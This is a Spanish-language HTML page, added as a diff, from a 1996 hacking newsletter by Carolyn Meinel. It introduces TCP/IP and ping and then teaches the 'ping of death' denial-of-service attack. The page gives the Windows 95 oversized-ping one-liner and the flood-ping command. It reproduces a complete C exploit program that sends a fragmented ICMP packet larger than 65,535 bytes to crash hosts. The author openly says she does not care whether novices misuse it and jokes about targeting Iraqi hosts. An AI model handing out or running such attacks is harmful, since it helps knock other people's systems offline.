@@ -1,0 +1,785 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<html>
+
+<head>
+<meta http-equiv="Content-Type"
+content="text/html; charset=iso-8859-1">
+<meta name="Versión" content="8.0.3514">
+<meta name="Fecha" content="05/12/96">
+<meta name="Template"
+content="C:\Archivos de programa\Microsoft Office\Office\HTML.DOT">
+<meta name="GENERATOR" content="Microsoft FrontPage 2.0">
+<title>guia2_3</title>
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000" link="#0000FF"
+vlink="#800080">
+
+<hr>
+
+<p><font size="4"><b>GUÍA DEL HACKING (mayormente) INOFENSIVO</b></font></p>
+
+<p>Vol. 2 Numero 3</p>
+
+<p><b><i>Introducción a TCP/IP. ¡Eso significa paquetes!
+¡Datagramas! Se explica el exploit de denegación de servicio
+por paquete de ping gigante. Pero este hack es mucho menos
+inofensivo que la mayoría. No intentes esto en casa...</i></b></p>
+
+<hr>
+
+<p>Si has estado en la lista Happy Hacker por un momento, habrás
+estado recibiendo elementos dirigidos de la lista Bugtraq acerca
+de un nuevo exploit de paquetes ping.</p>
+
+<p>Si esto te ha estado sonando a galimatías, relájate. Es
+realmente muy sencillo. De hecho, es tan simple que si usas
+Windows 95, en cuanto termines este texto sabrás un simple
+comando de una sola línea que podrás usar para tirar abajo
+muchos hosts y routers de Internet.</p>
+
+<hr>
+
+<p><b>ADVERTENCIA PUEDES IR A LA CÁRCEL</b>: Esta vez no voy a
+implorar a los genios malignos &quot;quiero-ser-hacker&quot; en
+la lista para que sean virtuosos y resistan la tentación de
+emplear mal la información que estoy apunto de darles. ¡Mira si
+me preocupa! Si uno de esos tíos es pillado tirando abajo miles
+de hosts y routers de Internet, no solo irán a la cárcel y
+tendrán una gran multa. Todos nosotros pensaremos que el o ella
+es un/a gran capullo. Este exploit es un comando desde Windows 95
+nada complicado y de una sola línea. Si, el sistema operativo
+que esta diseñado para retrasados mentales desorientados. Así
+que no hay nada de elite sobre este hack. Lo que es elite es ser
+capaz de desbaratar este ataque.</p>
+
+<p><i>NOTA PARA NOVATOS</i>: Si los paquetes, datagramas, y
+TCP/IP no son exactamente tus entrañables colegas aun, créeme,
+necesitas de verdad meterte en la cama con ellos para poderte
+llamar hacker. Así que quédate aquí para algo de material
+técnico. Cuando lo tengas, tendrás la satisfacción de saber
+que puedes sembrar estragos en Internet, pero son muy elite para
+llevarlos hacerlo. Mas aun, este exploit ha sido descubierto
+recientemente -- como hace unos días. Así que pronto sabrás
+cosas que la mayoría de los hackers elite ni siquiera han oído
+aun.</p>
+
+<p>Un paquete es un modo de mandar información electrónica que
+mantiene fuera los errores. La idea es que ninguna tecnología de
+transmisión es perfecta. ¿Has jugado alguna vez al juego
+&quot;teléfono&quot;? Reúnes una docena de gente o así en un
+circulo y la primera persona le susurra un mensaje al segundo.
+Algo como &quot;El bollo es la forma más pequeña de
+cereal&quot;. La segunda persona le susurra al tercero, &quot;Un
+bollo es la forma más pequeña de estafar&quot;. La tercera
+susurra, &quot;El ron es la forma más pequeña de beber&quot;. Y
+así. Es muy divertido el descubrir lo mucho que un mensaje puede
+mutar mientras recorre el circulo.</p>
+
+<p>Pero entonces, por ejemplo, recibes email, preferirás que no
+este todo hecho un lío. Así que el ordenador que manda el email
+lo divide en pequeños trozos llamados datagramas. Entonces
+envuelve las cosas alrededor de cada datagrama que le dice a que
+ordenadores debe dirigirse, de donde procedía, y que compruebe
+si el datagrama ha podido ser truncado. A estos embalajes de
+datagramas envueltos se les llaman &quot;paquetes&quot;.</p>
+
+<p>Ahora si el ordenador que te manda el email fuera a
+&quot;embalar&quot; un mensaje realmente largo en tan solo un
+paquete, las posibilidades de que se desordene todo en su camino
+al otro ordenador son muy grandes. Un poco chungo. Así que
+cuando el ordenador que lo recibe comprueba el paquete y
+encuentra que se desordeno, lo tirara y le dirá al otro
+ordenador que lo vuelva a mandar. Podría llevar mucho tiempo
+hasta que este paquete gigante llegue intacto.</p>
+
+<p>Pero si el mensaje esta dividido en un montón de pequeños
+trozos y envueltos en manojos de paquetes, la mayoría de ellos
+estarán bien y el ordenador destino los guardara. Entonces le
+dirá al ordenador remitente que reenvíe solo los paquetes que
+estaban hechos un lío. Entonces cuando todos los trozos lleguen
+finalmente allí, el ordenador destinatario los une en el orden
+correcto y allí esta, ahí esta el mensaje completo, email sin
+errores.</p>
+
+<p>TCP/IP significa Transmission Control Protocol/Internet
+Protocol. Le dice a los ordenadores que están conectados a
+Internet como empaquetar los mensajes en paquetes y como leer
+paquetes estos paquetes de otros ordenadores. El ping usa TCP/IP
+para hacer sus paquetes.</p>
+
+<hr>
+
+<p>&quot;Ping&quot; es un comando que manda una sonda de tu
+ordenador a otro ordenador para ver si esta encendido y conectado
+a la misma red a la que lo estas tu. En Internet hay unos 10
+millones de ordenadores a los que puedes hacer ping.</p>
+
+<p>Ping es un comando que puedes dar, por ejemplo, desde los
+sistemas operativos UNIX, Windows 95 y Windows NT. Es parte del
+Internet Control Message Protocol (ICMP), que es usado para
+localizar averías de redes TCP/IP. Lo que hace es decir a un
+ordenador remoto que devuelva el ping. Mas aun, algunas formas
+del comando ping te dirán además lo que tarda un mensaje en ir
+a ese ordenador y volver de vuelta.</p>
+
+<p>Pero ¿cómo sabe tu ordenador que el ping que acaba de mandar
+ha vuelto del ordenador apuntado? El datagrama es la respuesta.
+El ping enviado es un paquete, y como cualquier paquete esta
+envuelto alrededor de un datagrama. Si el ping devuelto mantiene
+este mismo datagrama, sabes que fue tu ping que acaba de ser
+devuelto.</p>
+
+<p>El formato básico de este comando es simplemente:</p>
+
+<p>ping hostname</p>
+
+<p>donde &quot;hostname&quot; es la dirección de Internet del
+ordenador que quieres comprobar.</p>
+
+<p>Cuando doy este comando desde el UNIX Release 4.1 de Sun, la
+respuesta que recibo es &quot;hostname is alive&quot;.</p>
+
+<hr>
+
+<p><b>CONSEJO TÉCNICO</b>: Debido a los poderes destructivos del
+ping, muchos proveedores de servicios de Internet esconden el
+programa ping en sus cuentas shell donde los novatos
+desorientados no puedan meter sus manos. Si tu cuenta shell dice
+&quot;comando no encontrado&quot; cuando metes el comando ping,
+prueba:</p>
+
+<p>/usr/etc/ping hostname</p>
+
+<p>Si esto no funciona, quéjate al servicio técnico de tu
+proveedor.</p>
+
+<p><i>NOTA PARA NOVATOS</i>: ¿Dices que no puedes encontrar un
+modo de hacer ping desde tu servicio ON-LINE? Eso puede ser
+quizás debido a que no tienes cuenta shell. Pero hay una cosa
+que realmente necesitas para hackear: ¡¡¡UNA CUENTA SHELL!!!</p>
+
+<p>La razón por la cual los hackers se ríen de la gente con
+cuentas en America Online es por que ese proveedor no da cuentas
+shell. Esto es debido a que America Online quiere que seáis
+buenos chicos y chicas y no hackeeis.</p>
+
+<p>Una &quot;cuenta shell&quot; es una cuenta de Internet en la
+que tu ordenador se convierte en un terminal de uno de los hosts
+de tu proveedor. Una vez estas en el &quot;shell&quot; puedes dar
+comandos al sistema operativo (que normalmente es UNIX) como si
+estuvieras sentado allí en la consola de uno de los hosts de tu
+proveedor.</p>
+
+<p>Puede que ya tengas una cuenta shell pero simplemente no sepas
+como meterte en ella. Llama al soporte técnico de tu proveedor
+para averiguar si tienes una y como conectarte.</p>
+
+<hr>
+
+<p>Hay toda clase de variaciones del comando ping. Y, sabes algo,
+donde quiera que hay un comando que ejecutas en Internet que
+tenga muchas variaciones, puedes simplemente contar con que haya
+algo hackeable ahí. ¡Muhahaha!</p>
+
+<p>El flood ping es un ejemplo simple. Si tu sistema operativo te
+permite dar el comando:</p>
+
+<p>-&gt; ping -f hostname</p>
+
+<p>manda un verdadero aluvión de pings, tan rápido como el host
+de tu proveedor pueda hacerlo. Esto mantiene al host al que has
+apuntado tan ocupado devolviendo tus pings que poco más puede
+hacer. También pone una carga muy pesada en la red.</p>
+
+<p>Hackers con habilidades primitivas algunas veces se unirán y
+usaran varios de sus ordenadores a la vez para hacer ping
+simultáneamente al ordenador host de alguna víctima de
+Internet. Esto generalmente mantendrá al ordenador de la
+víctima muy ocupado para hacer cualquier otra cosa. Puede
+incluso venirse abajo. Sin embargo, la parte mala (desde el punto
+de vista de los atacantes) es que mantiene al ordenador atacante
+atado también.</p>
+
+<hr>
+
+<p><i>NOTA NETIQUETTE</i>: Hacer flood ping a un ordenador es
+extremadamente rudo. Que te cazen haciendo esto y tendrás suerte
+si lo peor que ocurre es que tu proveedor de servicios on-line
+cierra tu cuenta. Haz esto a un hacker serio y necesitaras un
+transplante de identidad.</p>
+
+<p>Si por accidente llegas a empezar un tipo de flood ping,
+puedes detenerlo presionando la tecla control y &quot;c&quot;
+(control-c).</p>
+
+<p><i>CONSEJO DE GENIO MALIGNO</i>: ¡Hazte un ping a ti mismo!
+Si usas algún tipo de UNIX, tu sistema operativo te dejara usar
+tu ordenador para hacerle simplemente casi todo lo que él puede
+hacer a otros ordenadores. La dirección de red que te manda de
+vuelta a tu propio ordenador es localhost (o 127.0.0.1). Aquí va
+un ejemplo de como uso localhost:</p>
+
+<p>&lt;slug&gt; [65] -&gt;telnet localhost</p>
+
+<p>Trying 127.0.0.1 ...</p>
+
+<p>Connected to localhost.</p>
+
+<p>Escape character is '^]'. </p>
+
+<p>SunOS UNIX (slug)</p>
+
+<p>login: </p>
+
+<p>Ves, vuelvo de nuevo a la secuencia de login del ordenador
+llamado &quot;slug&quot;.</p>
+
+<p>Ahora me hago un ping a mí mismo:</p>
+
+<p>&lt;llama&gt; [68] -&gt;/usr/etc/ping localhost </p>
+
+<p>localhost is alive </p>
+
+<p>Esto me da el mismo resultado que si diera el comando:</p>
+
+<p>&lt;llama&gt; [69] -&gt;/usr/etc/ping llama</p>
+
+<p>llama.swcp.com is alive</p>
+
+<p><i>CONSEJO MUHAHAHA</i>: ¿Quieres tirar de la cadena de
+alguien? Dile que haga ftp a 127.0.0.1 y que se conecte usando su
+propio nombre de usuario y password para pillar ¡warez cojonudo!
+Mi exmarido Keith Henson lo hizo en la Iglesia de la
+Cienciologia. Los miembros hicieron ftp a 127.0.0.1 y
+descubrieron todas sus escrituras con Copyright. Asumieron que
+esto estaba en el ordenador de Keith, no en el suyo. Estaban
+*tan* seguros de que tenia sus escrituras que le llevaron a
+juicio. El juez, cuando se dio cuenta de que estaban simplemente
+haciendo un loop en su propio ordenador, literalmente les mando
+de la sala descojonándose de ellos.</p>
+
+<p>Para una transcripción buenísima o cinta de audio de esta
+sesión de juicio infame, manda un email a
+hkhenson@cup.portal.com. Esa es la dirección email de Keith.
+¡Me quito el sombrero por un superhacker!</p>
+
+<hr>
+
+<p>Sin embargo, el exploit del paquete ping descomunal que estas
+apunto de aprender puede incluso hacer mas daño a algunos hosts
+que una banda de conspiradores de ping flood. Y lo hará sin
+necesidad de reunir los ordenadores de los atacantes por mas del
+segundo que tarda &#130;l en enviar un solo ping.</p>
+
+<p>El modo más fácil de hacer esto es correr Windows 95. ¿No
+lo tienes?</p>
+
+<p>Generalmente podrás encontrar un almacén El Cheapo que te lo
+mandara por $99.</p>
+
+<p>Para hacer esto, primero configura tu sistema Windows 95 para
+que puedas establecer una conexión PPP o SLIP con Internet
+usando el programa de Acceso Telefónico a Redes en el icono de
+Mi PC. Necesitaras algo de ayuda del soporte técnico de tu
+proveedor para configurar esto. Debes hacerlo de este modo o este
+hack no funcionara. Tu dialer de America Online *definitivamente*
+no funcionara.</p>
+
+<hr>
+
+<p><i>NOTA PARA NOVATOS</i>: Si tu conexión a Internet te
+permite ejecutar un browser que muestre gráficos/fotos, puedes
+usar tu numero de llamada con el programa de Acceso Telefónico a
+Redes de tu Windows 95 para pillar una conexión o bien PPP o
+SLIP </p>
+
+<hr>
+
+<p>Lo siguiente, conéctate a Internet. Pero no ejecutes ningún
+browser o lo que sea. En vez de eso, una vez que el programa de
+Acceso Telefónico a Redes te diga que estas conectado, haz click
+en el botón &quot;Inicio&quot; y vete a &quot;MS-DOS&quot;.</p>
+
+<p>Abre esta ventana DOS. Recibirás el prompt:</p>
+
+<p>C:\windows\&gt;</p>
+
+<p>Ahora primeramente hagamos esto de la manera de buen
+ciudadano. En este prompt puedes teclear el comando
+&quot;ping&quot;:</p>
+
+<p>C:\windows\ping hostname</p>
+
+<p>donde &quot;hostname&quot; es la dirección de algún
+ordenador de Internet. Por ejemplo, puedes hacer ping a
+thales.nmia.com, que es uno de mis ordenadores favoritos, que
+esta detrás de algún filosofo Griego oscuro.</p>
+
+<p>Ahora si ocurre que sabes la dirección de uno de los
+ordenadores de Sadam Hussein, sin embargo, puede que quieras dar
+el comando:</p>
+
+<p>c:\windows\ping -l 65510 saddam_hussein's.computer.mil</p>
+
+<p>¡Realmente no lo hagas a un ordenador real! Algunos, pero no
+todos, los ordenadores se vendrán abajo y se mantendrán o bien
+colgados o se resetearán cuando reciban este ping. Otros
+continuaran funcionando alegremente, y de repente se irán abajo
+horas mas tarde.</p>
+
+<p>¿Por que? Ese extra añadido -l 65510 crea un datagrama
+gigante que es envuelto dentro del paquete ping. Algunos
+ordenadores, cuando se les pide que devuelvan un datagrama
+idéntico, se hacen un verdadero lío.</p>
+
+<p>Si quieres saber todos los detalles sangrientos de este
+exploit ping, incluyendo el cómo proteger tus ordenadores de
+él, comprueba: http://www.sophist.demon.co.uk/ping </p>
+
+<p>Ahora, hay otras formas de crear un datagrama ping gigante
+además de usar Windows 95. Por ejemplo, si corres alguna
+versión UNIX de FreeBSD o Linux en tu PC, puedes ejecutar este
+programa, que fue posteado a la lista Bugtraq.</p>
+
+<p>From: Bill Fenner &lt;fenner@freefall.freebsd.org&gt;</p>
+
+<p>To: Multiple recipients of list BUGTRAQ
+&lt;BUGTRAQ@netspace.org&gt;</p>
+
+<p>Subject: Ping exploit program</p>
+
+<p>Ya que hay gente que no tiene necesariamente cajas de Windows
+95 por ahí, yo (Fenner) escribí el siguiente programa exploit.
+Requiere un raw socket layer que no interfiera con el paquete,
+así que BSD 4.3, SunOS y Solaris están fuera. Funciona bien en
+sistemas 4.4BSD. Puede funcionar en Linux si lo compilas con
+-DREALLY_RAW. </p>
+
+<p>Eres libre de hacer con esto lo que quieras. Por favor usa
+esto solo para testear tus propias maquinas, y no para tirar las
+de otros.</p>
+
+<p>* win95ping.c</p>
+
+<p>*</p>
+
+<p>* Simulate the evil win95 &quot;ping -l 65510 buggyhost&quot;.</p>
+
+<p>* version 1.0 Bill Fenner &lt;fenner@freebsd.org&gt;
+22-Oct-1996</p>
+
+<p>*</p>
+
+<p>* This requires raw sockets that don't mess with the packet at
+all (other</p>
+
+<p>* than adding the checksum). That means that SunOS, Solaris,
+and</p>
+
+<p>* BSD4.3-based systems are out. BSD4.4 systems (FreeBSD,
+NetBSD,</p>
+
+<p>* OpenBSD, BSDI) will work. Linux might work, I don't have a
+Linux</p>
+
+<p>* system to try it on.</p>
+
+<p>*</p>
+
+<p>* The attack from the Win95 box looks like:</p>
+
+<p>* 17:26:11.013622 cslwin95 &gt; arkroyal: icmp: echo request
+(frag 6144:1480@0+)</p>
+
+<p>* 17:26:11.015079 cslwin95 &gt; arkroyal: (frag
+6144:1480@1480+)</p>
+
+<p>* 17:26:11.016637 cslwin95 &gt; arkroyal: (frag
+6144:1480@2960+)</p>
+
+<p>* 17:26:11.017577 cslwin95 &gt; arkroyal: (frag
+6144:1480@4440+)</p>
+
+<p>* 17:26:11.018833 cslwin95 &gt; arkroyal: (frag
+6144:1480@5920+)</p>
+
+<p>* 17:26:11.020112 cslwin95 &gt; arkroyal: (frag
+6144:1480@7400+)</p>
+
+<p>* 17:26:11.021346 cslwin95 &gt; arkroyal: (frag
+6144:1480@8880+)</p>
+
+<p>* 17:26:11.022641 cslwin95 &gt; arkroyal: (frag
+6144:1480@10360+)</p>
+
+<p>* 17:26:11.023869 cslwin95 &gt; arkroyal: (frag
+6144:1480@11840+)</p>
+
+<p>* 17:26:11.025140 cslwin95 &gt; arkroyal: (frag
+6144:1480@13320+)</p>
+
+<p>* 17:26:11.026604 cslwin95 &gt; arkroyal: (frag
+6144:1480@14800+)</p>
+
+<p>* 17:26:11.027628 cslwin95 &gt; arkroyal: (frag
+6144:1480@16280+)</p>
+
+<p>* 17:26:11.028871 cslwin95 &gt; arkroyal: (frag
+6144:1480@17760+)</p>
+
+<p>* 17:26:11.030100 cslwin95 &gt; arkroyal: (frag
+6144:1480@19240+)</p>
+
+<p>* 17:26:11.031307 cslwin95 &gt; arkroyal: (frag
+6144:1480@20720+)</p>
+
+<p>* 17:26:11.032542 cslwin95 &gt; arkroyal: (frag
+6144:1480@22200+)</p>
+
+<p>* 17:26:11.033774 cslwin95 &gt; arkroyal: (frag
+6144:1480@23680+)</p>
+
+<p>* 17:26:11.035018 cslwin95 &gt; arkroyal: (frag
+6144:1480@25160+)</p>
+
+<p>* 17:26:11.036576 cslwin95 &gt; arkroyal: (frag
+6144:1480@26640+)</p>
+
+<p>* 17:26:11.037464 cslwin95 &gt; arkroyal: (frag
+6144:1480@28120+)</p>
+
+<p>* 17:26:11.038696 cslwin95 &gt; arkroyal: (frag
+6144:1480@29600+)</p>
+
+<p>* 17:26:11.039966 cslwin95 &gt; arkroyal: (frag
+6144:1480@31080+)</p>
+
+<p>* 17:26:11.041218 cslwin95 &gt; arkroyal: (frag
+6144:1480@32560+)</p>
+
+<p>* 17:26:11.042579 cslwin95 &gt; arkroyal: (frag
+6144:1480@34040+)</p>
+
+<p>* 17:26:11.043807 cslwin95 &gt; arkroyal: (frag
+6144:1480@35520+)</p>
+
+<p>* 17:26:11.046276 cslwin95 &gt; arkroyal: (frag
+6144:1480@37000+)</p>
+
+<p>* 17:26:11.047236 cslwin95 &gt; arkroyal: (frag
+6144:1480@38480+)</p>
+
+<p>* 17:26:11.048478 cslwin95 &gt; arkroyal: (frag
+6144:1480@39960+)</p>
+
+<p>* 17:26:11.049698 cslwin95 &gt; arkroyal: (frag
+6144:1480@41440+)</p>
+
+<p>* 17:26:11.050929 cslwin95 &gt; arkroyal: (frag
+6144:1480@42920+)</p>
+
+<p>* 17:26:11.052164 cslwin95 &gt; arkroyal: (frag
+6144:1480@44400+)</p>
+
+<p>* 17:26:11.053398 cslwin95 &gt; arkroyal: (frag
+6144:1480@45880+)</p>
+
+<p>* 17:26:11.054685 cslwin95 &gt; arkroyal: (frag
+6144:1480@47360+)</p>
+
+<p>* 17:26:11.056347 cslwin95 &gt; arkroyal: (frag
+6144:1480@48840+)</p>
+
+<p>* 17:26:11.057313 cslwin95 &gt; arkroyal: (frag
+6144:1480@50320+)</p>
+
+<p>* 17:26:11.058357 cslwin95 &gt; arkroyal: (frag
+6144:1480@51800+)</p>
+
+<p>* 17:26:11.059588 cslwin95 &gt; arkroyal: (frag
+6144:1480@53280+)</p>
+
+<p>* 17:26:11.060787 cslwin95 &gt; arkroyal: (frag
+6144:1480@54760+)</p>
+
+<p>* 17:26:11.062023 cslwin95 &gt; arkroyal: (frag
+6144:1480@56240+)</p>
+
+<p>* 17:26:11.063247 cslwin95 &gt; arkroyal: (frag
+6144:1480@57720+)</p>
+
+<p>* 17:26:11.064479 cslwin95 &gt; arkroyal: (frag
+6144:1480@59200+)</p>
+
+<p>* 17:26:11.066252 cslwin95 &gt; arkroyal: (frag
+6144:1480@60680+)</p>
+
+<p>* 17:26:11.066957 cslwin95 &gt; arkroyal: (frag
+6144:1480@62160+)</p>
+
+<p>* 17:26:11.068220 cslwin95 &gt; arkroyal: (frag
+6144:1480@63640+)</p>
+
+<p>* 17:26:11.069107 cslwin95 &gt; arkroyal: (frag
+6144:398@65120)</p>
+
+<p>*/</p>
+
+<p>&nbsp;</p>
+
+<p>#include &lt;stdio.h&gt;</p>
+
+<p>#include &lt;sys/types.h&gt;</p>
+
+<p>#include &lt;sys/socket.h&gt;</p>
+
+<p>#include &lt;netdb.h&gt;</p>
+
+<p>#include &lt;netinet/in.h&gt;</p>
+
+<p>#include &lt;netinet/in_systm.h&gt;</p>
+
+<p>#include &lt;netinet/ip.h&gt;</p>
+
+<p>#include &lt;netinet/ip_icmp.h&gt;</p>
+
+<p>&nbsp;</p>
+
+<p>/*</p>
+
+<p>* If your kernel doesn't muck with raw packets, #define
+REALLY_RAW.</p>
+
+<p>* This is probably only Linux.</p>
+
+<p>*/</p>
+
+<p>#ifdef REALLY_RAW</p>
+
+<p>#define FIX(x) htons(x)</p>
+
+<p>#else</p>
+
+<p>#define FIX(x) (x)</p>
+
+<p>#endif</p>
+
+<p>&nbsp;</p>
+
+<p>int</p>
+
+<p>main(int argc, char **argv)</p>
+
+<p>{</p>
+
+<p>int s;</p>
+
+<p>char buf[1500];</p>
+
+<p>struct ip *ip = (struct ip *)buf;</p>
+
+<p>struct icmp *icmp = (struct icmp *)(ip + 1);</p>
+
+<p>struct hostent *hp;</p>
+
+<p>struct sockaddr_in dst;</p>
+
+<p>int offset;</p>
+
+<p>int on = 1;</p>
+
+<p>&nbsp;</p>
+
+<p>bzero(buf, sizeof buf);</p>
+
+<p>if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) &lt; 0) {</p>
+
+<p>perror(&quot;socket&quot;);</p>
+
+<p>exit(1);</p>
+
+<p>}</p>
+
+<p>if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on))
+&lt; 0) {</p>
+
+<p>perror(&quot;IP_HDRINCL&quot;);</p>
+
+<p>exit(1);</p>
+
+<p>}</p>
+
+<p>if (argc != 2) {</p>
+
+<p>fprintf(stderr, &quot;usage: %s hostname\n&quot;, argv[0]);</p>
+
+<p>exit(1);</p>
+
+<p>}</p>
+
+<p>if ((hp = gethostbyname(argv[1])) == NULL) {</p>
+
+<p>if ((ip-&gt;ip_dst.s_addr = inet_addr(argv[1])) == -1) {</p>
+
+<p>fprintf(stderr, &quot;%s: unknown host\n&quot;, argv[1]);</p>
+
+<p>}</p>
+
+<p>} else {</p>
+
+<p>bcopy(hp-&gt;h_addr_list[0], &amp;ip-&gt;ip_dst.s_addr,
+hp-&gt;h_length);</p>
+
+<p>}</p>
+
+<p>&nbsp;</p>
+
+<p>printf(&quot;Sending to %s\n&quot;, inet_ntoa(ip-&gt;ip_dst));</p>
+
+<p>ip-&gt;ip_v = 4;</p>
+
+<p>ip-&gt;ip_hl = sizeof *ip &gt;&gt; 2;</p>
+
+<p>ip-&gt;ip_tos = 0;</p>
+
+<p>ip-&gt;ip_len = FIX(sizeof buf);</p>
+
+<p>ip-&gt;ip_id = htons(4321);</p>
+
+<p>ip-&gt;ip_off = FIX(0);</p>
+
+<p>ip-&gt;ip_ttl = 255;</p>
+
+<p>ip-&gt;ip_p = 1;</p>
+
+<p>ip-&gt;ip_sum = 0; /* kernel fills in */</p>
+
+<p>ip-&gt;ip_src.s_addr = 0; /* kernel fills in */</p>
+
+<p>&nbsp;</p>
+
+<p>dst.sin_addr = ip-&gt;ip_dst;</p>
+
+<p>dst.sin_family = AF_INET;</p>
+
+<p>&nbsp;</p>
+
+<p>icmp-&gt;icmp_type = ICMP_ECHO;</p>
+
+<p>icmp-&gt;icmp_code = 0;</p>
+
+<p>icmp-&gt;icmp_cksum = htons(~(ICMP_ECHO &lt;&lt; 8));</p>
+
+<p>/* the checksum of all 0's is easy to compute */</p>
+
+<p>&nbsp;</p>
+
+<p>for (offset = 0; offset &lt; 65536; offset += (sizeof buf -
+sizeof *ip)) {</p>
+
+<p>ip-&gt;ip_off = FIX(offset &gt;&gt; 3);</p>
+
+<p>if (offset &lt; 65120)</p>
+
+<p>ip-&gt;ip_off |= FIX(IP_MF);</p>
+
+<p>else</p>
+
+<p>ip-&gt;ip_len = FIX(418); /* make total 65538 */</p>
+
+<p>if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&amp;dst,</p>
+
+<p>sizeof dst) &lt; 0) {</p>
+
+<p>fprintf(stderr, &quot;offset %d: &quot;, offset);</p>
+
+<p>perror(&quot;sendto&quot;);</p>
+
+<p>}</p>
+
+<p>if (offset == 0) {</p>
+
+<p>icmp-&gt;icmp_type = 0;</p>
+
+<p>icmp-&gt;icmp_code = 0;</p>
+
+<p>icmp-&gt;icmp_cksum = 0;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>(Fin del mensaje del exploit ping de Fenner.) </p>
+
+<hr>
+
+<p><b>NOTA PUEDES IR A LA CÁRCEL</b>: No sólo este hack no es
+élite, si estás leyendo esto no sabes lo suficiente para evitar
+ser cazado por llevar a cabo este hack. Por otro lado, si fueras
+a hacerlo a un host de Internet en Iraq...</p>
+
+<hr>
+
+<p>Por supuesto hay muchas otras cosas guay que puedes hacer con
+el ping. Si tienes una cuenta shell, puedes descubrir un montón
+de cosas acerca del ping dando el comando:</p>
+
+<p>man ping</p>
+
+<p>De hecho, puedes obtener un montón de detalles de cualquier
+comando de UNIX con &quot;man&quot;.</p>
+
+<p>Diviértete con el ping -- y ¡se bueno! Pero recuerda, no
+estoy implorando a los genios malignos quiero-ser-hacker que sean
+buenos. Mira si me preocupo cuando te cazen...</p>
+
+<hr>
+
+<p>¿Quieres ver números atrasados de la Guía del Hacking
+(casi) Inofensivo? Mira <a
+href="http://www.feist.com/~tqdb/evis-unv.html">http://www.feist.com/~tqdb/evis-unv.html</a>.
+¿Quieres suscribirte a esta lista? Email <a
+href="mailto:majordomo@edm.net">majordomo@edm.net</a> con el
+mensaje &quot;subscribe happyhacker.&quot; ¿Quieres compartir
+material guay con la lista Happy Hacker? Manda tu mensaje a <a
+href="mailto:hh@edm.net">hh@edm.net</a>. Para mandarme email
+confidencial (discusiones de actividades ilegales no) usa <a
+href="mailto:cmeinel@techbroker.com">cmeinel@techbroker.com</a>.
+Por favor dirige tus flames hacia <a
+href="mailto:dev/null@techbroker.com">dev/null@techbroker.com</a>.
+Happy hacking!</p>
+
+<p>Copyright 1996 Carolyn P. Meinel. Puedes distribuir la GUÍA
+DEL HACKING (mayormente) INOFENSIVO mientras dejes esta nota al
+final.</p>
+
+<hr>
+
+<p align="center"><font size="1" face="Eurasia"><strong>| </strong></font><a
+href="index2.htm"><font size="1" face="Eurasia"><strong>Indice</strong></font></a><font
+size="1" face="Eurasia"><strong> | </strong></font><a
+href="cv.htm"><font size="1" face="Eurasia"><strong>Mi
+Currículum Vitae</strong></font></a><font size="1"
+face="Eurasia"><strong> | </strong></font><a href="descarga.htm"><font
+size="1" face="Eurasia"><strong>Descarga de archivos</strong></font></a><font
+size="1" face="Eurasia"><strong> | </strong></font><a
+href="guias.htm"><font size="1" face="Eurasia"><strong>Volver a
+Guías de C. Meinel</strong></font></a><font size="1"
+face="Eurasia"><strong> | </strong></font><a href="fotos.htm"><font
+size="1" face="Eurasia"><strong>Album de fotos</strong></font></a><font
+size="1" face="Eurasia"><strong> | </strong></font><a
+href="buscadores.htm"><font size="1" face="Eurasia"><strong>Buscadores</strong></font></a><font
+size="1" face="Eurasia"><strong> |</strong></font></p>
+
+<hr>
+
+<p align="center"><font size="3" face="Surfer"><strong>Esta
+página está alojada en</strong> </font><a href="/"><font
+size="3" face="Surfer"><img src="/pictures/gc_icon.gif"
+align="middle" border="0"></font></a><font size="3" face="Surfer">&nbsp;
+</font></p>
+</body>
+</html>
